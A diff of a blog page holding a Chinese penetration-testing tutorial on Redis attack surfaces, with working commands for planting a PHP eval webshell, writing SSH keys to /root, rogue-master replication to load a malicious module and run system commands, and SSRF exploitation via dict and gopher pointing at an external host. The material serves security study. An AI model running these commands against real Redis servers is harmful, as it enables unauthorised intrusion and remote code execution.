@@ -405,14 +405,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.9k
+                    4.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    23 分
+                    17 分
                 </div>
                 
 
@@ -438,7 +438,7 @@
 <span class="token number">3</span><span class="token punctuation">.</span>config get requirepass
 # docker部署默认都是以redis权限执行的。
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/1d7fee2337d64c8e8a978b5485b1df0e.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/1d7fee2337d64c8e8a978b5485b1df0e.png"></p>
 <p>可以看到默认对外开放且无密码的。</p>
 <p>但是在3.2.0之后增加了一个保护模式，默认还是无密码，但是限制了只有本地(回环接口)才能访问。</p>
 <p>总的来说,问题还是出在了无密码校验经常被钻空子,比如ssrf,用来权限提升等等,下面会说到。</p>
@@ -448,8 +448,8 @@ config set dir
 </code></pre>
 <p>来控制,从而可以实现任意文件写功能。</p>
 <h2 id="0x2-1-信息泄露"><a href="#0x2-1-信息泄露" class="headerlink" title="0x2.1 信息泄露"></a>0x2.1 信息泄露</h2><p>这个比较鸡肋,简单提提</p>
-<p>redis 有个info的命令,返回关于 Redis 服务器的各种信息和统计数值。<br><img src="https://img-blog.csdnimg.cn/12228b486dd244a78f373e555d2864ff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>config get *也会泄露一些信息</p>
-<p><img src="https://img-blog.csdnimg.cn/773f52917fcf4f81a18272e327598364.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>redis 有个info的命令,返回关于 Redis 服务器的各种信息和统计数值。<br><img src="https://img-blog.csdnimg.cn/12228b486dd244a78f373e555d2864ff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>config get *也会泄露一些信息</p>
+<p><img src="https://img-blog.csdnimg.cn/773f52917fcf4f81a18272e327598364.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
 <h2 id="0x2-2-写webshell"><a href="#0x2-2-写webshell" class="headerlink" title="0x2.2 写webshell"></a>0x2.2 写webshell</h2><p>这种情况一般大都是出在了root权限执行的redis中,或者是以某个web服务来启动的redis，从而对web目录具有了可写的权限。</p>
 <p>这个操作网上的payload其实很多都有风险性,一些不懂redis的小白就很容易误操作。</p>
 <pre class=" language-java"><code class="language-java">flushall
@@ -458,11 +458,11 @@ config set dir <span class="token operator">/</span>var<span class="token operat
 config set dbfilename shell<span class="token punctuation">.</span>php
 save
 </code></pre>
-<p>最终生成一个redis数据库快照,里面包含了数据内容写到dbfilename设置的路径中。<br><img src="https://img-blog.csdnimg.cn/08a70ef1cd3748628cac89969e3da914.png" alt="在这里插入图片描述"><br>里面有个flushall命令会清空所有缓存数据,这个在一定程度不会造成巨大的损失，但是会给业务体验带来影响。</p>
+<p>最终生成一个redis数据库快照,里面包含了数据内容写到dbfilename设置的路径中。<br><img src="https://img-blog.csdnimg.cn/08a70ef1cd3748628cac89969e3da914.png"><br>里面有个flushall命令会清空所有缓存数据,这个在一定程度不会造成巨大的损失，但是会给业务体验带来影响。</p>
 <p>redis 默认数据库有16个:</p>
 <pre class=" language-java"><code class="language-java">config get databases
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/c2ac676a3dd24b18aa6afe68b9acdeaf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>默认保存的是当前数据库下内容,所以我们完全不用flushall来清空默认0号的数据库内容</p>
+<p><img src="https://img-blog.csdnimg.cn/c2ac676a3dd24b18aa6afe68b9acdeaf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>默认保存的是当前数据库下内容,所以我们完全不用flushall来清空默认0号的数据库内容</p>
 <p>我们只需这样子select 去切换其他的空数据库,然后就可以了。</p>
 <pre class=" language-java"><code class="language-java">select <span class="token number">5</span>
 set <span class="token number">1</span> <span class="token string">'&lt;?php eval($_POST["cmd"]);?>'</span>
@@ -473,71 +473,12 @@ save
 <p>比如:</p>
 <p>keys *(这个最好别用,输出量很容易把环境崩掉)</p>
 <p>可以考虑用dbsize</p>
-<p><img src="https://img-blog.csdnimg.cn/eae353737d004508b1f78f5afb74823b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们就可以选择第5号数据库来执行操作,根本不需要进行fluashall的高危操作。</p>
+<p><img src="https://img-blog.csdnimg.cn/eae353737d004508b1f78f5afb74823b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>我们就可以选择第5号数据库来执行操作,根本不需要进行fluashall的高危操作。</p>
 <p>这里可以看到save命令保存下来的文件，其实因为是数据库备份为快照文件所以存在一定格式(脏数据),但是由于PHP解析的松散性,这些都不影响php的执行。‘</p>
 <h2 id="0x2-3-写入SSH-免密登录"><a href="#0x2-3-写入SSH-免密登录" class="headerlink" title="0x2.3 写入SSH 免密登录"></a>0x2.3 写入SSH 免密登录</h2><p>这个场景主要应用在没有web应用的服务器，redis一般都是与web分离的，故这种方式我个人觉得还是很棒的，在linux系统都存在/root目录也不会被改动,笔者觉得这种方式还是可以接受的。</p>
 <p>如centos:(这个没有登录过root,没有没有.ssh文件夹，问题不大)</p>
-<p><img src="https://img-blog.csdnimg.cn/6233932d5b0049e5abab73b7508c95ca.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<p>浅析Linux下Redis的攻击面(一)</p>
-<p>xq17 / 2020-07-13 09:46:22 / 浏览数 9985 安全技术 众测渗透顶(0) 踩(0)<br>浅析Linux下Redis的攻击面(一)<br>0x0 前言<br>  Redis在内网渗透中常常扮演着重要的角色，其攻击方式非常多样化，在内网复杂的环境架构中容易出现各种问题，那么如何有效利用Redis的缺陷来达到我们的目的呢,这里笔者结合一些实操场景和大师傅们的文章做了一些分析和总结。</p>
-<p>0x1 Redis的简介<br>官方简介: Introduction to Redis</p>
-<p>我的理解:</p>
-<p>Redis是C语言开发一个开源(遵循BSD)协议高性能的(key-value)键值对的内存NoSQL数据库,可以用作数据库、缓存、信息中间件(性能非常优秀，支持持久化到硬盘且高可用)，由于其自身特点，可以广泛应用在数据集群，分布式队列，信息中间件等网络架构中，在内网渗透的突破中，常常扮演getshell的角色，</p>
-<p>0x2 Redis环境的搭建<br>我们可以去官网看看:</p>
-<p><a target="_blank" rel="noopener" href="https://redis.io/download">https://redis.io/download</a></p>
-<p>这里我们可以学习一下Redis的版本控制方式:</p>
-<p>Redis uses a standard practice for its versioning: major.minor.patchlevel. An even minor marks a stable release, like 1.2, 2.0, 2.2, 2.4, 2.6, 2.8. Odd minors are used for unstable releases, for example 2.9.x releases are the unstable versions of what will be Redis 3.0 once stable.</p>
-<p>可以看到1.2.3,这样的格式,其中1是大版本，2是小改动，3是bug修复，其中 2中的数字，Odd(奇数)代表的是不稳定的发行版，而Even(偶数)代表是稳定的发行版。</p>
-<p>目前Redis 稳定版已经更新redis6.0,在实际的实战中，一般不会那么高，包括我自己用的，普遍都是4.x-5.x,有的甚至更低。</p>
-<p>在官网中提供了多种安装方式,有手工编译的，也有docker的， 笔者由于是重度docker玩家，所以主选docker这种方式，其实原因主要还是卸载方便和基于Ubuntu环境比较贴近实战环境(笔者是MacOS环境)。</p>
-<p>但是为了方便分析版本差异,也通过编译源码的方式来运行一些版本。</p>
-<p>redis全部版本源码</p>
-<p>这里为了研究差异,笔者分别安装了3个版本的环境用来测试:</p>
-<p>4.x版本的环境: vulhub 4.0.14</p>
-<p>1.git clone <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub.git">https://github.com/vulhub/vulhub.git</a><br>2. cd ./vulhub/redis/4-unacc<br>3.docker-compose up -d<br>5.x版本的环境:</p>
-<p>这里选取redis官方的镜像版本</p>
-<p>docker pull redis:5.0.9<br>通过观察官方镜像的dockerfile文件</p>
-<p>RUN groupadd -r -g 999 redis &amp;&amp; useradd -r -g redis -u 999 redis<br>RUN mkdir /data &amp;&amp; chown redis:redis /data<br>可以看到创建了一个专门用于程序运行的系统账号。</p>
-<p>运行:</p>
-<p>docker run –name redis5 -p6379:6379 -d  redis:5.0.9<br>远程ubunut环境安装管理包的redis4.0.9(用来模拟常见的情况,一般linux及其都是以root权限运行很多程序的)</p>
-<p>apt-get install redis-server</p>
-<p>然后以root用户启动的,只能用bind的ip，external ip是会被拒绝的。</p>
-<p>0x3 常见的利用方式<br>redis 安全问题可以参考:</p>
-<p>1.A few things about Redis security</p>
-<p>2.Redis安全</p>
-<p>这里我简单说一下Redis容易遭受的攻击点,而这些点本身就是软件设计便捷理念。</p>
-<p>redis为了系统的移植方便，多集群的快速部署，在3.2.0之前默认都是无密码，对外暴露6379的</p>
-<p>1.docker run –name redis -p6379:6379 -d redis:3.0<br>2.redis-cli x.x.x.123<br>3.config get requirepass</p>
-<h1 id="docker部署默认都是以redis权限执行的。"><a href="#docker部署默认都是以redis权限执行的。" class="headerlink" title="docker部署默认都是以redis权限执行的。"></a>docker部署默认都是以redis权限执行的。</h1><p>可以看到默认对外开放且无密码的。</p>
-<p>但是在3.2.0之后增加了一个保护模式，默认还是无密码，但是限制了只有本地(回环接口)才能访问。</p>
-<p>总的来说,问题还是出在了无密码校验经常被钻空子,比如ssrf,用来权限提升等等,下面会说到。</p>
-<p>然后Redis自身提供了一个config的命令,用来实现备份功能，然后备份的文件名和备份的路径都可以通过</p>
-<p>config set dbfilename<br>config set dir<br>来控制,从而可以实现任意文件写功能。</p>
-<p>0x3.1 信息泄露<br>这个比较鸡肋,简单提提</p>
-<p>redis 有个info的命令,返回关于 Redis 服务器的各种信息和统计数值。</p>
-<p>config get *也会泄露一些信息</p>
-<p>0x3.2 写webshell<br>这种情况一般大都是出在了root权限执行的redis中,或者是以某个web服务来启动的redis，从而对web目录具有了可写的权限。</p>
-<p>这个操作网上的payload其实很多都有风险性,一些不懂redis的小白就很容易误操作。</p>
-<p>flushall<br>set 1 ‘<!--?php eval($_GET["cmd"]);?-->‘<br>config set dir /var/www/html<br>config set dbfilename shell.php<br>save<br>最终生成一个redis数据库快照,里面包含了数据内容写到dbfilename设置的路径中。</p>
-<p>里面有个flushall命令会清空所有缓存数据,这个在一定程度不会造成巨大的损失，但是会给业务体验带来影响。</p>
-<p>redis 默认数据库有16个:</p>
-<p>config get databases<br>127.0.0.1:6380[2]&gt; config get databases</p>
-<ol>
-<li>“databases”</li>
-<li>“16”</li>
-</ol>
-<p>127.0.0.1:6380[2]&gt;</p>
-<p>默认保存的是当前数据库下内容,所以我们完全不用flushall来清空默认0号的数据库内容</p>
-<p>我们只需这样子select 去切换其他的空数据库,然后就可以了。</p>
-<p>select 5<br>set 1 ‘<!--?php eval($_POST["cmd"]);?-->‘<br>config set dir /var/www/html<br>config set dbfilename shell.php<br>save<br>比如:</p>
-<p>keys *(这个最好别用,输出量很容易把环境崩掉)</p>
-<p>可以考虑用dbsize</p>
-<p>我们就可以选择第5号数据库来执行操作,根本不需要进行fluashall的高危操作。</p>
-<p>这里可以看到save命令保存下来的文件，其实因为是数据库备份为快照文件所以存在一定格式(脏数据),但是由于PHP解析的松散性,这些都不影响php的执行。</p>
-<h2 id="0x3-3-写入SSH-免密登录"><a href="#0x3-3-写入SSH-免密登录" class="headerlink" title="0x3.3 写入SSH 免密登录"></a>0x3.3 写入SSH 免密登录</h2><p>这个场景主要应用在没有web应用的服务器，redis一般都是与web分离的，故这种方式我个人觉得还是很棒的，在linux系统都存在/root目录也不会被改动,笔者觉得这种方式还是可以接受的。</p>
-<p>如centos:(这个没有登录过root,没有没有.ssh文件夹，问题不大)</p>
-<p><img src="https://img-blog.csdnimg.cn/03f62626553d4e16949bc931f8938729.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<p>如ubuntu:<br><img src="https://img-blog.csdnimg.cn/52bce61905ab45f99f919ba9e122cbb2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到可行性还是可圈可点的。</p>
+<p><img src="https://img-blog.csdnimg.cn/03f62626553d4e16949bc931f8938729.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>如ubuntu:<br><img src="https://img-blog.csdnimg.cn/52bce61905ab45f99f919ba9e122cbb2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以看到可行性还是可圈可点的。</p>
 <p>写入过程:</p>
 <pre class=" language-java"><code class="language-java">ssh<span class="token operator">-</span>keygen <span class="token operator">-</span>t rsa
 # 然后指定目录生成<span class="token number">2</span>个文件 私钥<span class="token operator">:</span>id_rsa 公钥<span class="token operator">:</span>id_rsa<span class="token punctuation">.</span>pub
@@ -555,7 +496,7 @@ save
 <p>尝试连接下:</p>
 <pre class=" language-java"><code class="language-java">ssh root<span class="token annotation punctuation">@139</span><span class="token punctuation">.</span>X<span class="token punctuation">.</span>X<span class="token punctuation">.</span>X <span class="token operator">-</span>i id_rsa
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/3a10b803146e486f9edda77699540c3e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>PS (一些疑惑):</p>
+<p><img src="https://img-blog.csdnimg.cn/3a10b803146e486f9edda77699540c3e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>PS (一些疑惑):</p>
 <p>网上搜了一些文章说，因为默认的话是不允许开启通过开启密钥来登录。</p>
 <p>默认在/etc/ssh/sshd_config中不开启</p>
 <p>`#PubkeyAuthentication yes</p>
@@ -580,7 +521,7 @@ save
 <h2 id="0x2-5-写入高冗余数据"><a href="#0x2-5-写入高冗余数据" class="headerlink" title="0x2.5 写入高冗余数据"></a>0x2.5 写入高冗余数据</h2><p>当我们写入的内容是属于高冗余的数据时，redis默认会采用LZF压缩的方式来写入数据。</p>
 <pre class=" language-java"><code class="language-java">压缩：Redis默认采用LZF算法对生成的RDB文件做压缩处理，压缩后的文件远远小于内存大小，默认开启，可以通过参数config setrdbcompression<span class="token punctuation">{</span>yes<span class="token operator">|</span>no<span class="token punctuation">}</span>动态修改。
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/5fc5b4d47abb48f4b014d623a099b8a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这个时候我们就会出现一些奇怪的错误,</p>
+<p><img src="https://img-blog.csdnimg.cn/5fc5b4d47abb48f4b014d623a099b8a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>这个时候我们就会出现一些奇怪的错误,</p>
 <p>debug起来相当麻烦</p>
 <p>解决思路:关闭压缩功能。</p>
 <pre class=" language-java"><code class="language-java">config set rdbcompression no
@@ -602,7 +543,7 @@ save
 <p>这里重点是实现全量传输:</p>
 <p>全量传输是将数据库备份文件整个传输过去，然后从节点清空内存数据库，将备份文件加载到数据库中。</p>
 <p>具体的实现步骤:</p>
-<p><img src="https://img-blog.csdnimg.cn/dee89244c08c49a7b40d4cde2201c22e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/dee89244c08c49a7b40d4cde2201c22e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
 <p>那么怎么控制实现这些操作呢，其实很简单，我们可以监控一下正常流程，截取出相应的命令再进行构造好了，这些操作其实还是蛮复杂的，要不然也不要等Pavel Toporkov来公布了吧。</p>
 <p>不过这个调试协议虽然繁琐但是还是可以做出来的。<br>跟一下wireshark走一遍流程就好了，站在巨人的肩膀也行。</p>
 <p><a target="_blank" rel="noopener" href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>
@@ -610,13 +551,13 @@ save
 <p>Dliv3师傅的比较适合实战:<a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p>
 <pre class=" language-java"><code class="language-java">python3 redis<span class="token operator">-</span>rogue<span class="token operator">-</span>server<span class="token punctuation">.</span>py <span class="token operator">--</span>rhost <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span> <span class="token operator">--</span>rport <span class="token number">6380</span> <span class="token operator">--</span>lhost docker<span class="token punctuation">.</span><span class="token keyword">for</span><span class="token punctuation">.</span>mac<span class="token punctuation">.</span>host<span class="token punctuation">.</span>internal <span class="token operator">--</span>lport <span class="token number">8088</span>
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/6e82d31ed9fe409e9f2fb93c7d129147.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到效果还是有的。</p>
+<p><img src="https://img-blog.csdnimg.cn/6e82d31ed9fe409e9f2fb93c7d129147.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以看到效果还是有的。</p>
 <p>这个工具还有个用法是,是服务器模式,接收目标redis的链接。</p>
 <p>(这种场景可以使用在，服务器通外网，但是外网不能访问服务器时候，但是我们可以通过ssrf或者vpn之后链接redis来执行命令)</p>
 <p>服务器端执行:</p>
 <pre class=" language-java"><code class="language-java">python3 redis<span class="token operator">-</span>rogue<span class="token operator">-</span>server<span class="token punctuation">.</span>py <span class="token operator">--</span>server<span class="token operator">-</span>only
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/f41bc7ae59c348aeb76cca65b63013f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>本地手工执行命令设置备份:</p>
+<p><img src="https://img-blog.csdnimg.cn/f41bc7ae59c348aeb76cca65b63013f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>本地手工执行命令设置备份:</p>
 <pre class=" language-java"><code class="language-java"><span class="token number">1</span><span class="token punctuation">.</span>config set dir <span class="token punctuation">.</span>/
 <span class="token number">2</span><span class="token punctuation">.</span>config set dbfilename exp<span class="token punctuation">.</span>so
 <span class="token number">3</span><span class="token punctuation">.</span>slaveof X<span class="token punctuation">.</span>X<span class="token punctuation">.</span>X<span class="token number">.195</span>
@@ -630,7 +571,7 @@ save
 <span class="token number">9</span><span class="token punctuation">.</span>system<span class="token punctuation">.</span>exec <span class="token string">'rm ./exp.so'</span>
 <span class="token number">10</span><span class="token punctuation">.</span>module unload system
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/d4b67d0cd0ce42748c6a8f08cf5e064f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>PS:(一些渗透需要注意的点)</p>
+<p><img src="https://img-blog.csdnimg.cn/d4b67d0cd0ce42748c6a8f08cf5e064f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>PS:(一些渗透需要注意的点)</p>
 <p>经过测试,这个payload打的时候会重置所有数据库内容,所以慎用,在测试过程中，倒是没有遇到redis会崩溃的问题，可能是数据量比较少？</p>
 <h2 id="0x3-3-可利用的版本"><a href="#0x3-3-可利用的版本" class="headerlink" title="0x3.3 可利用的版本"></a>0x3.3 可利用的版本</h2><p>经过测试主从复制的可利用版本是4.x-5.x，但是从6.0开始,就开始利用失败了。但是还是可以通过config命令来进行写文件的,也能通过主从复制来无损加载文件,但是在module的时候加载却失败了.</p>
 <h2 id="0x3-4-禁用config命令绕过"><a href="#0x3-4-禁用config命令绕过" class="headerlink" title="0x3.4 禁用config命令绕过"></a>0x3.4 禁用config命令绕过</h2><p>如果在redis.conf 配置了禁用config命令的时候。</p>
@@ -638,8 +579,8 @@ save
 </code></pre>
 <p>比如这个config命令就不可用了，可以采取这种方式绕过。</p>
 <p>这个时候我们就没办法自定义文件后缀了，但是我们还是可以利用主从复制的</p>
-<p><img src="https://img-blog.csdnimg.cn/50f20257a6b347c28693146ee5161a93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到同步之后exp.so的内容被保存为了dump.rdb</p>
-<p><img src="https://img-blog.csdnimg.cn/575a43e4939845abab9a0a5a9a026e56.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>后面把dump.rdb当做exp.so去正常加载即可。</p>
+<p><img src="https://img-blog.csdnimg.cn/50f20257a6b347c28693146ee5161a93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以看到同步之后exp.so的内容被保存为了dump.rdb</p>
+<p><img src="https://img-blog.csdnimg.cn/575a43e4939845abab9a0a5a9a026e56.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>后面把dump.rdb当做exp.so去正常加载即可。</p>
 <h2 id="0x4-SSRF对redis的利用"><a href="#0x4-SSRF对redis的利用" class="headerlink" title="0x4 SSRF对redis的利用"></a>0x4 SSRF对redis的利用</h2><p>SSRF为Redis的供给面打开了一个口子,但是由于dict和gopher协议的有一些坑点，有时候利用起来会出现一些下面的问题。</p>
 <p>简单探测redis服务:</p>
 <pre class=" language-java"><code class="language-java"><span class="token number">1</span><span class="token punctuation">.</span>curl <span class="token string">"dict://127.0.0.1:6381"</span>
@@ -655,15 +596,15 @@ save
 </code></pre>
 <p>这里dict有个比较好的特点就是会再末尾补上\r\n</p>
 <p>不好的是,命令多条的话，需要一条条地去执行,因为不支持传入换行,也不会对%0d%0解码</p>
-<p><img src="https://img-blog.csdnimg.cn/29af9c0555e54ebb90c606c13627855b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>(2)gopher协议</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/29af9c0555e54ebb90c606c13627855b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br><strong>(2)gopher协议</strong></p>
 <p>互联网上使用的分布型的文件搜集获取网络协议。</p>
 <p>支持多行输入。</p>
 <p>使用格式:</p>
 <p>gopher://serverip:port/_data</p>
-<p>特点:<br><img src="https://img-blog.csdnimg.cn/74c7248332ea43f8a940712b064e1140.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到gopher的第一个字符被吞掉了，还有没有发送quit</p>
+<p>特点:<br><img src="https://img-blog.csdnimg.cn/74c7248332ea43f8a940712b064e1140.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以看到gopher的第一个字符被吞掉了，还有没有发送quit</p>
 <p>所以我们需要手动加一个字符如_</p>
 <p>影响范围:</p>
-<p><img src="https://img-blog.csdnimg.cn/f6cbef68381e420a9fdf78663da3b123.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/f6cbef68381e420a9fdf78663da3b123.png"></p>
 <h2 id="0x4-2-无认证SSRF攻击"><a href="#0x4-2-无认证SSRF攻击" class="headerlink" title="0x4.2 无认证SSRF攻击"></a>0x4.2 无认证SSRF攻击</h2><p>dict协议的攻击:</p>
 <pre class=" language-java"><code class="language-java"><span class="token number">1</span><span class="token punctuation">.</span>连接远程主服务器
 curl dict<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">6381</span><span class="token operator">/</span>slaveof<span class="token operator">:</span><span class="token number">101.200</span><span class="token punctuation">.</span><span class="token number">157.195</span><span class="token operator">:</span><span class="token number">21000</span>
@@ -680,15 +621,15 @@ curl dict<span class="token operator">:</span><span class="token operator">/</sp
 <span class="token number">7</span><span class="token punctuation">.</span>删除痕迹
 curl dict<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">6381</span><span class="token operator">/</span>system<span class="token punctuation">.</span>exec<span class="token operator">:</span>rm <span class="token string">'./exp.so'</span>
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/2b4bad584bfe4d54938799cb3446a57a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功执行命令。</p>
+<p><img src="https://img-blog.csdnimg.cn/2b4bad584bfe4d54938799cb3446a57a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>成功执行命令。</p>
 <p>要是写shell的话参照上面那样做即可。</p>
 <p>gopher协议的攻击:</p>
 <p>这里采取goherus.py,来实现快速利用吧。</p>
 <pre class=" language-java"><code class="language-java"><span class="token number">1</span><span class="token punctuation">.</span>git clone https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>tarunkant<span class="token operator">/</span>Gopherus<span class="token punctuation">.</span>git
 <span class="token number">2</span><span class="token punctuation">.</span>gopherus <span class="token operator">--</span>exploit redis
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/9575ef6a78d74b6e8cb30961f9fc9395.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>Gopherus没有集成怎么主从复制的利用。简单分析下他的原理</p>
-<p><img src="https://img-blog.csdnimg.cn/5d429f219e4e469fa2a66a17027456cd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到这个伪造的是resp协议来交互(这个不打算展开,后面源码分析利用的时候会说明的)</p>
